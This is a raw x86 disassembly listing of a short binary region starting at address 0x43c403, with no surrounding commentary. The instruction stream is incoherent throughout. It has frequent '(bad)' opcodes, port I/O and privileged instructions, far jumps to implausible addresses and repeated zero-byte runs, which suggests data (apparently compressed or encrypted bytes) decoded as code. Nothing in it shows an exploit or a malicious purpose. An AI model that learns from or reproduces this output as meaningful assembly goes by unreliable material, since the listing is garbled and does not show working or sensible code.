  43c403:	mov    eax,ds:0xf703590c
  43c408:	inc    ecx
  43c409:	mov    WORD PTR [edx+0x4c626e8f],?
  43c40f:	xchg   ecx,eax
  43c410:	push   ebx
  43c411:	inc    edi
  43c412:	jb     0x43c408
  43c414:	add    esp,ebx
  43c416:	aaa    
  43c417:	jne    0x6a43232d
  43c41d:	push   ds
  43c41e:	mov    ah,0xf
  43c420:	mov    edx,0x5b95e2dd
  43c425:	cwde   
  43c426:	inc    ebx
  43c427:	sbb    ch,BYTE PTR [edi-0x39]
  43c42a:	mov    dl,0xe
  43c42c:	jmp    0xa66c2b11
  43c431:	or     edi,DWORD PTR [ebx-0x4d6c876d]
  43c437:	push   cs
  43c438:	fs ds pop esp
  43c43b:	test   al,0x89
  43c43d:	xchg   ebx,eax
  43c43e:	mov    dl,0xe
  43c440:	adc    DWORD PTR [ebx],esi
  43c442:	fwait
  43c443:	jmp    0x133c1c66
  43c448:	add    DWORD PTR [edi+esi*1+0xeab1944],0xffffffcc
  43c450:	add    al,0x94
  43c452:	das    
  43c453:	iret   
  43c454:	je     0x43c421
  43c456:	aad    0xfe
  43c458:	cdq    
  43c459:	test   BYTE PTR [edi+0x36],bh
  43c45c:	push   0x0
  43c45e:	add    BYTE PTR [eax],al
  43c460:	add    BYTE PTR [eax],al
  43c462:	xlat   BYTE PTR ds:[ebx]
  43c463:	dec    ebx
  43c464:	jmp    0x4f01e065
  43c469:	jmp    0xa0d83e8c
  43c46e:	add    BYTE PTR [ecx+0x348c3097],ah
  43c474:	dec    eax
  43c475:	cmc    
  43c476:	ror    BYTE PTR [ebx-0xd08a2ee],cl
  43c47c:	push   cs
  43c47d:	scas   al,BYTE PTR es:[edi]
  43c47e:	lea    esi,[edx+0x559429b3]
  43c484:	or     eax,0xce9da772
  43c489:	jo     0x43c4a6
  43c48b:	mov    bl,0x93
  43c48d:	mov    al,ds:0x82cf205b
  43c492:	stc    
  43c493:	aaa    
  43c494:	inc    esp
  43c495:	add    ch,al
  43c497:	std    
  43c498:	mov    DWORD PTR [eax],eax
  43c49a:	sub    DWORD PTR [edi-0x47b1f50a],ebp
  43c4a0:	out    0x8b,eax
  43c4a2:	(bad)  
  43c4a3:	mov    dl,0x70
  43c4a5:	call   FWORD PTR [ecx+eax*1-0x65a81722]
  43c4ac:	in     eax,0xff
  43c4ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c4af:	neg    BYTE PTR [ebp+0x3d]
  43c4b2:	rcr    DWORD PTR [edx+0x5b],cl
  43c4b5:	inc    DWORD PTR [edi+eiz*2]
  43c4b8:	imul   eax,DWORD PTR [ecx+ebp*8-0x49],0xfffffffd
  43c4bd:	ja     0x43c49a
  43c4bf:	outs   dx,BYTE PTR ds:[esi]
  43c4c0:	jmp    0x74:0xdd31a98a
  43c4c7:	add    BYTE PTR [eax],al
  43c4c9:	add    BYTE PTR [eax],al
  43c4cb:	mov    ebp,cs
  43c4cd:	inc    esp
  43c4ce:	or     BYTE PTR [eax+0x18],ah
  43c4d1:	push   ss
  43c4d2:	(bad)  
  43c4d3:	daa    
  43c4d4:	dec    ebx
  43c4d5:	xchg   BYTE PTR [ebx+0x6cfaef9],ah
  43c4db:	xchg   ecx,eax
  43c4dc:	into   
  43c4dd:	dec    esi
  43c4de:	add    BYTE PTR [ecx-0x410009bc],ah
  43c4e4:	int    0x4c
  43c4e6:	adc    BYTE PTR [edx-0x750c6c4c],dl
  43c4ec:	not    BYTE PTR [ecx-0x22ce5e89]
  43c4f2:	jmp    0x43c4fd
  43c4f4:	gs stos BYTE PTR es:[edi],al
  43c4f6:	pop    edi
  43c4f7:	mov    edi,0x75c2d119
  43c4fc:	mov    dh,0x3d
  43c4fe:	mov    ecx,DWORD PTR [ebp+0x31]
  43c501:	repz clc 
  43c503:	call   0x79445fa9
  43c508:	mov    dh,0x6b
  43c50a:	jge    0x43c56d
  43c50c:	scas   eax,DWORD PTR es:[edi]
  43c50d:	pop    ebx
  43c50e:	push   esi
  43c50f:	loop   0x43c4ff
  43c511:	aas    
  43c512:	mov    edx,DWORD PTR [eax+0x74446b05]
  43c518:	aas    
  43c519:	and    BYTE PTR [edi-0x7d],0xc9
  43c51d:	fisubr DWORD PTR [edi-0x78]
  43c520:	aas    
  43c521:	mov    bl,0x7c
  43c523:	mov    ch,0x53
  43c525:	adc    al,0x85
  43c527:	rcr    DWORD PTR cs:[ecx-0x6e3d7fdd],cl
  43c52e:	and    eax,DWORD PTR [eax]
  43c530:	add    BYTE PTR [eax],al
  43c532:	add    BYTE PTR [eax],al
  43c534:	mov    WORD PTR [ecx-0x22],fs
  43c537:	test   bl,cl
  43c539:	push   ebx
  43c53a:	addr16 push esp
  43c53c:	mov    ah,0x4b
  43c53e:	push   es
  43c53f:	add    DWORD PTR [esi-0x7b7af1a5],ecx
  43c545:	scas   eax,DWORD PTR es:[edi]
  43c546:	loop   0x43c5c4
  43c548:	jne    0x43c59d
  43c54a:	adc    DWORD PTR [edx-0x80],esi
  43c54d:	aam    0xa8
  43c54f:	or     edx,DWORD PTR ds:0xe80bca08
  43c555:	stos   BYTE PTR es:[edi],al
  43c556:	push   cs
  43c557:	add    BYTE PTR [eax-0x63dc6e2c],dl
  43c55d:	aam    0xa0
  43c55f:	add    edx,DWORD PTR ds:0xa817ca00
  43c565:	jecxz  0x43c53f
  43c567:	clc    
  43c568:	mov    bh,0xd7
  43c56a:	dec    ebp
  43c56b:	je     0x43c4f8
  43c56d:	and    BYTE PTR [eax-0xd48ab76],ah
  43c573:	dec    esi
  43c574:	or     ebx,DWORD PTR [eax-0x6cf4e012]
  43c57a:	jmp    0xcf9:0x178b83e7
  43c581:	sbb    edi,DWORD PTR [edi+0x3]
  43c584:	inc    eax
  43c585:	pop    edx
  43c586:	or     edi,esi
  43c588:	rcr    DWORD PTR [ebx],0xb8
  43c58b:	pop    ecx
  43c58c:	retf   
  43c58d:	aam    0x9
  43c58f:	pop    ebx
  43c590:	push   edx
  43c591:	mov    dl,0xfb
  43c593:	add    eax,ebx
  43c595:	cmp    eax,0x859c
  43c59a:	add    BYTE PTR [eax],al
  43c59c:	add    BYTE PTR [esi+esi*4+0x74],ah
  43c5a0:	xchg   DWORD PTR [edi-0x1f4ddb4b],edx
  43c5a6:	cmp    eax,0xc4477d66
  43c5ab:	push   es
  43c5ac:	aad    0x5c
  43c5ae:	mov    eax,DWORD PTR [eax]
  43c5b0:	cld    
  43c5b1:	mov    ds:0x8f8774fc,eax
  43c5b6:	scas   al,BYTE PTR es:[edi]
  43c5b7:	pop    esp
  43c5b8:	inc    ebp
  43c5b9:	pop    ss
  43c5ba:	out    0x43,eax
  43c5bc:	jnp    0x43c591
  43c5be:	inc    esi
  43c5bf:	retf   0x8e6
  43c5c2:	shl    bh,0x76
  43c5c5:	pop    ebx
  43c5c6:	ds inc eax
  43c5c8:	push   ebp
  43c5c9:	gs dec eax
  43c5cb:	sub    DWORD PTR [eax+0x7befbed0],eax
  43c5d1:	dec    ebx
  43c5d2:	mov    ebp,0x5ce3a76c
  43c5d7:	(bad)  
  43c5d9:	push   ebx
  43c5da:	inc    esi
  43c5db:	pop    ebp
  43c5dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c5dd:	jecxz  0x43c61b
  43c5df:	mov    cl,0xfb
  43c5e1:	pop    edi
  43c5e2:	in     eax,0x18
  43c5e4:	xchg   edx,eax
  43c5e5:	(bad)
  43c5e9:	mov    bh,0xa4
  43c5eb:	test   DWORD PTR [eax],ecx
  43c5ed:	mov    ecx,0x14fcbb39
  43c5f2:	jge    0x43c604
  43c5f4:	out    0xa5,al
  43c5f6:	inc    edi
  43c5f7:	icebp  
  43c5f8:	jge    0x43c64d
  43c5fa:	mov    ebp,0x726605bc
  43c5ff:	and    DWORD PTR [edx+0x0],ebp
  43c605:	add    ah,ah
  43c607:	jns    0x43c5bf
  43c609:	inc    DWORD PTR [edi-0x30e8a321]
  43c60f:	xor    ebp,DWORD PTR [ebx]
  43c611:	cld    
  43c612:	jbe    0x43c5f9
  43c614:	push   cs
  43c615:	pop    ds
  43c616:	and    DWORD PTR [edi],ebp
  43c618:	lds    esp,FWORD PTR [edx-0x66]
  43c61b:	mov    ecx,0xb293528c
  43c620:	push   cs
  43c621:	push   0x8
  43c623:	mov    al,0xe
  43c625:	out    0xcf,al
  43c627:	daa    
  43c628:	psubsw mm2,QWORD PTR [ebx-0x6bed0130]
  43c62f:	dec    ecx
  43c630:	and    al,0xd1
  43c632:	or     al,0xef
  43c634:	push   cs
  43c635:	jbe    0x43c675
  43c637:	sar    ah,0x28
  43c63a:	mov    WORD PTR ds:0xbe816cdf,gs
  43c640:	or     dh,BYTE PTR [edx+0x50]
  43c643:	mov    al,0xd1
  43c645:	out    dx,eax
  43c646:	scas   eax,DWORD PTR es:[edi]
  43c647:	adc    ecx,DWORD PTR [edi-0x17]
  43c64a:	mov    dh,ah
  43c64c:	adc    ch,BYTE PTR [esi]
  43c64e:	shr    DWORD PTR [edi-0x4d73fa02],1
  43c654:	shr    DWORD PTR [edi-0x8073819],1
  43c65a:	xchg   ebx,eax
  43c65b:	dec    ebp
  43c65c:	or     eax,0xe13381da
  43c661:	xchg   ebp,eax
  43c662:	cli    
  43c663:	(bad)  
  43c664:	jno    0x43c647
  43c666:	xchg   ebx,eax
  43c667:	lds    ebp,FWORD PTR [ebx-0x1f]
  43c66a:	add    BYTE PTR [eax],al
  43c66c:	add    BYTE PTR [eax],al
  43c66e:	add    BYTE PTR [edx-0x2d8fddf7],dl
  43c674:	inc    edi
  43c675:	fs loop 0x43c6ac
  43c678:	in     eax,dx
  43c679:	adc    ah,BYTE PTR [esi+edi*8+0x4b]
  43c67d:	idiv   DWORD PTR [esi+0x72ea4986]
  43c683:	ror    DWORD PTR [ebx+0x26],1
  43c686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c687:	add    esi,eax
  43c689:	ja     0x43c634
  43c68b:	lods   al,BYTE PTR ds:[esi]
  43c68c:	inc    ebp
  43c68d:	jmp    0xea00:0x1af504e9
  43c694:	cmp    DWORD PTR [edx],edx
  43c696:	add    bh,BYTE PTR [edi+0x714b935b]
  43c69c:	retf   0xfc3d
  43c69f:	push   ecx
  43c6a0:	inc    eax
  43c6a1:	in     eax,dx
  43c6a2:	push   DWORD PTR [esi]
  43c6a4:	retf   
  43c6a5:	dec    ebp
  43c6a6:	cld    
  43c6a7:	jb     0x43c631
  43c6a9:	jnp    0x43c6d2
  43c6ab:	nop
  43c6ac:	out    dx,al
  43c6ad:	test   BYTE PTR [ebx],0x39
  43c6b0:	mov    bl,0x91
  43c6b2:	inc    esi
  43c6b3:	inc    ecx
  43c6b4:	int3   
  43c6b5:	aam    0xe8
  43c6b7:	xchg   DWORD PTR [ebp-0x1143001c],ebp
  43c6bd:	bound  ecx,QWORD PTR [ebx]
  43c6bf:	mov    DWORD PTR [edi+0x731b5ffd],ebp
  43c6c5:	jmp    0xff8b:0x10ac28af
  43c6cc:	sub    cl,ch
  43c6ce:	mov    ah,BYTE PTR [edi+0x31feaf]
  43c6d4:	add    BYTE PTR [eax],al
  43c6d6:	add    BYTE PTR [eax],al
  43c6d8:	test   eax,0xc05b480f
  43c6dd:	hlt    
  43c6de:	adc    al,BYTE PTR [eax]
  43c6e0:	jmp    0xa8ad:0xf0664ef2
  43c6e7:	add    al,0xe9
  43c6e9:	and    al,0x6b
  43c6eb:	or     ebx,ebp
  43c6ed:	loop   0x43c6d8
  43c6ef:	sar    DWORD PTR [ebp-0x3a74c24e],0x33
  43c6f6:	repz clc 
  43c6f8:	sbb    BYTE PTR [esi+eiz*2],dh
  43c6fb:	or     BYTE PTR [eax+0x32574003],ch
  43c701:	pushf  
  43c702:	xchg   ebx,eax
  43c703:	stc    
  43c704:	push   ds
  43c705:	inc    edi
  43c706:	cmp    al,0xc0
  43c708:	ret    0x3b16
  43c70b:	div    BYTE PTR [eax+0x37]
  43c70e:	push   cs
  43c70f:	jne    0x43c6a1
  43c711:	mov    ch,0x8a
  43c713:	lahf   
  43c714:	nop
  43c715:	pop    ebx
  43c716:	push   cs
  43c717:	push   edx
  43c718:	jg     0x43c761
  43c71a:	(bad)  
  43c71b:	jl     0x43c6e9
  43c71d:	pop    ebx
  43c71e:	adc    DWORD PTR [ebx],edx
  43c720:	call   0xd43958e
  43c725:	sbb    al,0x9a
  43c727:	push   es
  43c728:	or     eax,DWORD PTR [esi+eax*1]
  43c72b:	stos   BYTE PTR es:[edi],al
  43c72c:	mov    edx,0x40851125
  43c731:	rcr    DWORD PTR [eax-0x65e1f2fd],cl
  43c737:	enter  0x7d0b,0xe
  43c73b:	call   0x43c740
  43c740:	add    al,ch
  43c742:	nop
  43c743:	adc    cl,bh
  43c745:	adc    al,0x1c
  43c747:	call   0xa536:0xabbd63bc
  43c74e:	inc    ebx
  43c74f:	pushf  
  43c750:	push   cs
  43c751:	pop    ss
  43c752:	mov    al,ds:0x575f853d
  43c757:	push   es
  43c758:	cmc    
  43c759:	imul   esi,ebp,0x10
  43c75c:	inc    edx
  43c75d:	mov    ebx,0xe76de606
  43c762:	retf   
  43c763:	adc    bl,BYTE PTR [ecx+0x4e]
  43c766:	and    BYTE PTR [ebp-0x1d],ah
  43c769:	inc    ebp
  43c76a:	cdq    
  43c76b:	jmp    0x2040c6f
  43c770:	jg     0x43c756
  43c772:	inc    ebx
  43c773:	adc    BYTE PTR [eax],al
  43c775:	nop
  43c776:	or     BYTE PTR [eax+edx*2+0x4164a31b],bh
  43c77d:	xchg   esp,eax
  43c77e:	(bad)  
  43c77f:	dec    ebp
  43c780:	or     DWORD PTR [esi+eiz*8],ecx
  43c783:	or     eax,0xa5d09000
  43c788:	or     esp,DWORD PTR [ebx-0x60]
  43c78b:	fs int 0x15
  43c78e:	mov    bl,0x9e
  43c790:	cmc    
  43c791:	adc    esi,DWORD PTR [esi]
  43c793:	clc    
  43c794:	add    edx,DWORD PTR [eax+0xcfc4839]
  43c79a:	lods   al,BYTE PTR ds:[esi]
  43c79b:	dec    edx
  43c79c:	mov    ss,WORD PTR [ebx-0x3103f84f]
  43c7a2:	mov    edi,0x7fa2
  43c7a7:	add    BYTE PTR [eax],al
  43c7a9:	add    BYTE PTR [esi-0x42],bl
  43c7ac:	and    bl,BYTE PTR [edx-0x30471e81]
  43c7b2:	mov    bh,0x31
  43c7b4:	cmp    al,0x4
  43c7b6:	pop    ecx
  43c7b7:	lahf   
  43c7b8:	das    
  43c7b9:	repnz (bad) 
  43c7bb:	mov    dl,0x6c
  43c7bd:	adc    al,0x13
  43c7bf:	cmp    al,0x4
  43c7c1:	in     eax,0x14
  43c7c3:	in     eax,dx
  43c7c4:	sti    
  43c7c5:	cmp    al,0x92
  43c7c7:	jp     0x43c844
  43c7c9:	les    ebp,FWORD PTR [edi]
  43c7cb:	cmp    al,BYTE PTR [edx]
  43c7cd:	clc    
  43c7ce:	push   cs
  43c7cf:	in     al,0xc7
  43c7d1:	cmp    al,0xd2
  43c7d3:	mov    edx,0xb2d0779b
  43c7d8:	xor    DWORD PTR [esi-0x41914c5d],edi
  43c7de:	xchg   ebx,eax
  43c7df:	pop    ecx
  43c7e0:	idiv   BYTE PTR [eax-0x13]
  43c7e3:	sub    dl,BYTE PTR cs:[eax+0xc7337b4]
  43c7ea:	jmp    0x43c830
  43c7ec:	and    DWORD PTR [esi+edx*2-0x8550d28],esi
  43c7f3:	lods   eax,DWORD PTR ds:[esi]
  43c7f4:	inc    edx
  43c7f5:	pop    es
  43c7f6:	fldcw  WORD PTR ds:0x37999038
  43c7fc:	jnp    0x43c80a
  43c7fe:	retf   
  43c7ff:	inc    esp
  43c800:	sbb    DWORD PTR [esp+edx*1-0x272ff8c],esi
  43c807:	inc    ebx
  43c808:	jmp    0xf7ea285
  43c80d:	xchg   esi,eax
  43c80e:	add    BYTE PTR [eax],al
  43c810:	add    BYTE PTR [eax],al
  43c812:	add    BYTE PTR [edi-0x6a16cdb4],ah
  43c818:	dec    ebx
  43c819:	xchg   esp,eax
  43c81a:	test   eax,0xde3eae07
  43c81f:	jle    0x43c805
  43c821:	cld    
  43c822:	sub    BYTE PTR [edx+eax*1+0x2f79c210],cl
  43c829:	adc    DWORD PTR [ebx-0x6d],edx
  43c82c:	sub    eax,0x9663bed9
  43c831:	into   
  43c832:	push   ss
  43c833:	cs (bad) 
  43c836:	stos   DWORD PTR es:[edi],eax
  43c837:	pop    edi
  43c838:	inc    esp
  43c839:	inc    ebx
  43c83a:	jb     0x43c8bb
  43c83c:	(bad)
  43c83f:	adc    dl,BYTE PTR [edi+0x23]
  43c842:	out    dx,eax
  43c843:	xchg   ebx,eax
  43c844:	mov    dl,0x3d
  43c846:	aaa    
  43c847:	mov    ecx,0xb91e16bf
  43c84c:	pop    esp
  43c84d:	mov    ?,WORD PTR [edi-0x6f]
  43c850:	aad    0x11
  43c852:	mov    ebx,0xe9df4bd3
  43c857:	xchg   ebx,eax
  43c858:	mov    dl,0x76
  43c85a:	in     eax,dx
  43c85b:	xchg   edx,eax
  43c85c:	mov    dl,0xe
  43c85e:	ins    BYTE PTR es:[edi],dx
  43c85f:	dec    edi
  43c860:	nop
  43c861:	cmp    bh,BYTE PTR [ecx+0x4e12d58c]
  43c867:	out    dx,al
  43c868:	retf   
  43c869:	cld    
  43c86a:	test   al,0x93
  43c86c:	das    
  43c86d:	iret   
  43c86e:	mov    ch,0xb1
  43c870:	aaa    
  43c871:	push   ebx
  43c872:	or     eax,0xd4e9f3c4
  43c877:	add    BYTE PTR [eax],al
  43c879:	add    BYTE PTR [eax],al
  43c87b:	add    BYTE PTR [ebx+0x5ee94eb5],ch
  43c881:	out    dx,al
  43c882:	xor    dl,cl
  43c884:	add    ecx,DWORD PTR [ebx+0x4]
  43c887:	sub    eax,0x620e83c0
  43c88c:	mov    esi,DWORD PTR [edi]
  43c88e:	add    DWORD PTR [eax],0xffffffc5
  43c891:	pop    edi
  43c892:	in     al,dx
  43c893:	(bad)  
  43c894:	mov    ecx,0x170f9f3e
  43c899:	vpcmpeqb xmm3,xmm5,xmm6
  43c89d:	retf   0x2ba8
  43c8a0:	mov    cl,0xd8
  43c8a2:	imul   edi,ecx,0xffffff9e
  43c8a5:	retf   0x6619
  43c8a8:	cli    
  43c8a9:	inc    ebp
  43c8aa:	inc    esi
  43c8ab:	je     0x43c91f
  43c8ad:	fldcw  WORD PTR [ebx-0x7]
  43c8b0:	xchg   ebx,eax
  43c8b1:	retf   0xf0d
  43c8b4:	out    0x6d,al
  43c8b6:	repz add edx,ebx
  43c8b9:	iret   
  43c8ba:	inc    esi
  43c8bb:	data16 lock lods al,BYTE PTR ds:[esi]
  43c8be:	imul   eax,edx,0x6b
  43c8c1:	mov    al,ds:0x3446049f
  43c8c6:	shl    BYTE PTR [esi-0x4c],cl
  43c8c9:	outs   dx,BYTE PTR ds:[esi]
  43c8ca:	pop    ebp
  43c8cb:	aad    0x5a
  43c8cd:	outs   dx,DWORD PTR ds:[esi]
  43c8ce:	jo     0x43c859
  43c8d0:	sub    esp,DWORD PTR [edx]
  43c8d2:	ds and al,0x49
  43c8d5:	push   es
  43c8d6:	mov    WORD PTR [eax],es
  43c8d8:	cmp    DWORD PTR [edi-0x4fadf90a],ebp
  43c8de:	out    0x8d,eax
  43c8e0:	add    BYTE PTR [eax],al
  43c8e2:	add    BYTE PTR [eax],al
  43c8e4:	add    BYTE PTR [ebp-0x6fde166],ah
  43c8ea:	scas   al,BYTE PTR es:[edi]
  43c8eb:	lea    esi,ds:0x9a50028b
  43c8f2:	scas   eax,DWORD PTR es:[edi]
  43c8f3:	aas    
  43c8f4:	lea    esp,[ebp-0x66]
  43c8f7:	push   edx
  43c8f8:	add    al,0xf9
  43c8fa:	scas   al,BYTE PTR es:[edi]
  43c8fb:	jbe    0x43c901
  43c8fd:	clc    
  43c8fe:	scas   al,BYTE PTR es:[edi]
  43c8ff:	push   cs
  43c900:	push   eax
  43c901:	push   ecx
  43c902:	add    esi,DWORD PTR [ebp-0x31d45101]
  43c908:	adc    al,0x34
  43c90a:	outs   dx,BYTE PTR ds:[esi]
  43c90b:	pop    ss
  43c90c:	test   DWORD PTR [eax-0x4006f2f3],edx
  43c912:	in     eax,0x56
  43c914:	and    al,0x68
  43c916:	ret    0x248e
  43c919:	add    dl,0x56
  43c91c:	and    al,0x7c
  43c91e:	xchg   esp,eax
  43c91f:	push   esi
  43c920:	and    al,0x78
  43c922:	dec    esi
  43c923:	push   cs
  43c924:	add    BYTE PTR [eax-0x4bdb963e],dl
  43c92a:	int3   
  43c92b:	paddd  mm7,mm5
  43c92e:	cmp    bh,BYTE PTR [edi+0x41]
  43c931:	jle    0x43c9af
  43c933:	jg     0x43c971
  43c935:	mov    BYTE PTR [ebx+0x53b44b7f],bl
  43c93b:	imul   BYTE PTR [ebx+0x0]
  43c93e:	or     cl,BYTE PTR ds:0x2ab8048b
  43c944:	add    al,0x90
  43c946:	dec    ebx
  43c947:	jg     0x43c994
  43c949:	add    BYTE PTR [eax],al
  43c94b:	add    BYTE PTR [eax],al
  43c94d:	add    BYTE PTR [ebx+edi*1-0xa],dh
  43c951:	frstor ds:0x50840d29
  43c957:	popa   
  43c958:	xchg   DWORD PTR [edi-0x7ab66629],edi
  43c95e:	xor    eax,0x9003d09f
  43c963:	mov    cl,0x91
  43c965:	push   es
  43c966:	cmp    BYTE PTR [ebx+0x12],0xbe
  43c96a:	mov    WORD PTR [ebx+0x78],cs
  43c96d:	jge    0x43c908
  43c96f:	push   edi
  43c970:	sahf   
  43c971:	(bad)  
  43c972:	ror    DWORD PTR [edi+0xe],1
  43c975:	push   edx
  43c976:	or     ebx,ebx
  43c978:	cwde   
  43c979:	dec    ecx
  43c97a:	mov    esi,cs
  43c97c:	fidiv  DWORD PTR [ebx-0x66]
  43c97f:	les    edx,FWORD PTR [edx]
  43c981:	xchg   cx,ax
  43c983:	mov    ch,bh
  43c985:	jl     0x43c9fd
  43c987:	push   edi
  43c988:	push   cs
  43c989:	test   DWORD PTR [esi-0x4e],eax
  43c98c:	fisttp WORD PTR [eax-0x7122392a]
  43c992:	(bad)  
  43c993:	retf   
  43c994:	test   BYTE PTR [edx],0xa0
  43c997:	xor    eax,0xe0900b92
  43c99c:	xor    al,0x84
  43c99e:	mov    ebx,0x9003f616
  43c9a3:	sub    eax,0xb4ec277c
  43c9a8:	test   DWORD PTR [ebx],0x141bef0f
  43c9ae:	adc    eax,0xac142e
  43c9b3:	add    BYTE PTR [eax],al
  43c9b5:	add    BYTE PTR [eax],al
  43c9b7:	test   DWORD PTR [ecx-0x8],eax
  43c9ba:	test   BYTE PTR [edi-0x2113dcbf],dl
  43c9c0:	push   cs
  43c9c1:	rol    DWORD PTR [ecx],1
  43c9c3:	sbb    esp,edx
  43c9c5:	test   al,0x83
  43c9c7:	pop    ebp
  43c9c8:	inc    ecx
  43c9c9:	icebp  
  43c9ca:	add    edx,DWORD PTR [eax+0x573370b1]
  43c9d0:	inc    ecx
  43c9d1:	clc    
  43c9d2:	push   edx
  43c9d3:	fild   QWORD PTR [edi]
  43c9d5:	cmp    al,0x28
  43c9d7:	test   al,0xe3
  43c9d9:	ins    BYTE PTR es:[edi],dx
  43c9da:	nop
  43c9db:	jae    0x43c9d7
  43c9dd:	cmc    
  43c9de:	add    edx,DWORD PTR [eax-0xc1377d3]
  43c9e4:	xchg   edi,eax
  43c9e5:	push   0x1
  43c9e7:	or     eax,0x18ff754a
  43c9ec:	(bad)  
  43c9ed:	in     eax,dx
  43c9ee:	mov    ebx,0x3f7b1d9
  43c9f3:	mul    DWORD PTR [ecx-0x176ffc0a]
  43c9f9:	add    al,0xfa
  43c9fb:	adc    cl,BYTE PTR [edi-0x37]
  43c9fe:	xchg   eax,ebp
  43ca00:	mov    cl,0xf7
  43ca02:	add    ebx,DWORD PTR [ebp-0x7b]
  43ca05:	sub    al,0x45
  43ca07:	mov    ch,0x6b
  43ca09:	punpcklbw mm0,DWORD PTR [eax-0x6a]
  43ca0d:	add    dl,BYTE PTR [esi-0x91eca97]
  43ca13:	push   ss
  43ca14:	push   0x3793e90f
  43ca19:	push   ebx
  43ca1a:	int    0x0
  43ca1c:	add    BYTE PTR [eax],al
  43ca1e:	add    BYTE PTR [eax],al
  43ca20:	lahf   
  43ca21:	aaa    
  43ca22:	sub    ebp,eax
  43ca24:	add    al,0x6a
  43ca26:	idiv   esi
  43ca28:	cld    
  43ca29:	cmp    edx,ebp
  43ca2b:	fs int3 
  43ca2d:	mov    edx,0xed0e9867
  43ca32:	xor    dl,cl
  43ca34:	inc    edx
  43ca35:	aaa    
  43ca36:	mov    edi,0x20586072
  43ca3b:	adc    DWORD PTR [edi-0x57d267c5],eax
  43ca41:	mov    ds:0xa990d18d,al
  43ca46:	xchg   edx,eax
  43ca47:	(bad)  
  43ca48:	xchg   ebx,eax
  43ca49:	mov    dl,0xe
  43ca4b:	fs push ebx
  43ca4d:	les    ebx,FWORD PTR [eax-0x6]
  43ca50:	nop
  43ca51:	test   eax,0xe406a6a1
  43ca56:	xor    cl,ch
  43ca58:	mov    ecx,0x3a41b35
  43ca5d:	xor    ecx,DWORD PTR [edi-0x17]
  43ca60:	sub    esp,DWORD PTR [ebx]
  43ca62:	cmp    BYTE PTR [esi-0x32acca70],cl
  43ca68:	xchg   eax,ebx
  43ca6a:	jmp    0x436f65e1
  43ca6f:	int    0x6b
  43ca71:	dec    edx
  43ca72:	cli    
  43ca73:	xchg   esi,eax
  43ca74:	push   ss
  43ca75:	cmp    edx,DWORD PTR [ecx+ebp*1+0x274f187]
  43ca7c:	pop    ecx
  43ca7d:	fidiv  DWORD PTR [eax+0x12]
  43ca80:	cld    
  43ca81:	int    0xd8
  43ca83:	bound  eax,QWORD PTR [eax]
  43ca85:	add    BYTE PTR [eax],al
  43ca87:	add    BYTE PTR [eax],al
  43ca89:	sete   BYTE PTR [edx+0xeb3fb00]
  43ca90:	push   0xfffffff2
  43ca92:	fsubr  QWORD PTR [ebx+edi*1-0x60]
  43ca96:	enter  0xbe0f,0xaa
  43ca9a:	mov    bl,0xe
  43ca9c:	add    BYTE PTR [eax-0x65],al
  43ca9f:	xchg   ebx,eax
  43caa0:	inc    esp
  43caa1:	int    0xa3
  43caa3:	xchg   ebx,eax
  43caa4:	dec    esp
  43caa5:	int    0xa7
  43caa7:	xchg   ebx,eax
  43caa8:	rcl    BYTE PTR [ecx-0x69011a97],1
  43caae:	cs push esi
  43cab0:	and    al,0xb1
  43cab2:	ss test eax,0x562cea04
  43cab8:	and    al,0xc1
  43caba:	xor    BYTE PTR [ebx],ch
  43cabc:	push   DWORD PTR [edx-0x437de897]
  43cac2:	aas    
  43cac3:	out    0xff,eax
  43cac5:	push   edx
  43cac6:	jns    0x43cadf
  43cac8:	mov    bh,0x2e
  43caca:	sub    ecx,DWORD PTR [esi]
  43cacc:	(bad)
  43cacf:	sub    al,BYTE PTR [eax]
  43cad1:	in     al,dx
  43cad2:	jbe    0x43cb32
  43cad4:	mov    ah,0x26
  43cad6:	mov    edx,0xdaf21032
  43cadb:	xor    bl,BYTE PTR [eax]
  43cadd:	ret    0x32e2
  43cae0:	and    al,0x26
  43cae2:	mov    es,ax
  43cae5:	mov    dl,0x2a
  43cae7:	cs mov esp,0x750eb32b
  43caed:	add    BYTE PTR [eax],al
  43caef:	add    BYTE PTR [eax],al
  43caf1:	add    bl,bl
  43caf3:	add    BYTE PTR [eax+eax*1+0x1891b339],ch
  43cafa:	adc    bl,BYTE PTR ds:0xb329bea8
  43cb00:	push   cs
  43cb01:	pop    edi
  43cb02:	shr    BYTE PTR [ebx],cl
  43cb04:	push   esi
  43cb05:	and    al,0xfd
  43cb07:	sub    edi,DWORD PTR [ebp+0xf7490e8]
  43cb0d:	cli    
  43cb0e:	div    DWORD PTR [esi-0x6b]
  43cb11:	ror    DWORD PTR [esi-0x1c],0x17
  43cb15:	mov    eax,0xe48d0
  43cb1a:	cmp    eax,0x92a3d6ca
  43cb1f:	dec    ecx
  43cb20:	push   cs
  43cb21:	mov    esi,0x85474998
  43cb26:	mov    ah,0xcb
  43cb28:	ficom  WORD PTR [edi]
  43cb2a:	arpl   WORD PTR [eax],ax
  43cb2c:	sbb    eax,0x9a8483c0
  43cb31:	pop    edx
  43cb32:	mov    eax,0xfbe78fc5
  43cb37:	jecxz  0x43caee
  43cb39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cb3a:	ss hlt 
  43cb3c:	je     0x43cb4e
  43cb3e:	jmp    0xe97c:0x78427f19
  43cb45:	adc    ah,ah
  43cb47:	inc    ebp
  43cb48:	dec    esi
  43cb49:	add    BYTE PTR [ebx],dl
  43cb4b:	adc    BYTE PTR [edx],bl
  43cb4d:	mov    eax,ebp
  43cb4f:	outs   dx,DWORD PTR ds:[esi]
  43cb50:	fwait
  43cb51:	pop    edx
  43cb52:	ins    BYTE PTR es:[edi],dx
  43cb53:	xchg   BYTE PTR fs:[eax],al
  43cb56:	add    BYTE PTR [eax],al
  43cb58:	add    BYTE PTR [eax],al
  43cb5a:	add    BYTE PTR [edi-0x3],ah
  43cb5d:	xchg   ecx,eax
  43cb5e:	mov    edi,0xbea64ce5
  43cb63:	nop
  43cb64:	dec    ebx
  43cb65:	push   cs
  43cb66:	in     eax,0xa1
  43cb68:	(bad)  
  43cb69:	ds call 0xf941c4a7
  43cb6f:	aas    
  43cb70:	ror    ch,1
  43cb72:	jae    0x43cafe
  43cb74:	jecxz  0x43cb1e
  43cb76:	jmp    FWORD PTR [edi]
  43cb78:	dec    esp
  43cb79:	sbb    DWORD PTR [ecx-0x74fcdeb0],esi
  43cb7f:	int    0x33
  43cb81:	div    BYTE PTR [eax]
